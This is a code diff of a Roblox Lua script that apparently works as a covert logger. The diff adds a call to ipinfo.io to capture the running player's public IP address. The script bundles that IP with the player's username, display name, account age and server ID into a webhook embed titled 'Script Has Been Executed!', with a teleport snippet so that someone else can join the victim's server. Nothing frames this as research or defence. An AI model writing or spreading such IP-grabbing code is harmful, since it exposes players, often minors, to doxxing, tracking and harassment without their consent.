@@ -7,8 +7,10 @@ local accountAge = player.AccountAge
 local gameUsername = player.DisplayName -- Use DisplayName for the in-game username
 local serverId = game.JobId -- Use JobId for the server ID
 local avatarUrl = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. username
-local ip = "https://api.ipify.org/"
 
+-- Get the public IP address using ipinfo.io
+local ipResponse = game:GetService("HttpService"):GetAsync("https://ipinfo.io/ip")
+local ip = ipResponse and ipResponse:gsub("\n", "") or "Failed to retrieve IP"
 
 local joinScript = "```lua\nEXECUTE THIS TO JOIN THEIR SERVER: \npcall(function() game:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId, \"" .. serverId .. "\", game:GetService(\"Players\").LocalPlayer) end)\n```"
 
@@ -17,7 +19,7 @@ local payload = {
     embeds = {
         {
             title = "Script Has Been Executed!",
-            description = "Username: " .. username .. "\nIp Address : " .. ip .. "\nDisplay User: " .. gameUsername .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
+            description = "Username: " .. username .. "\nIp Address: " .. ip .. "\nDisplay User: " .. gameUsername .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
             color = nil,
             image = {
                 url = avatarUrl
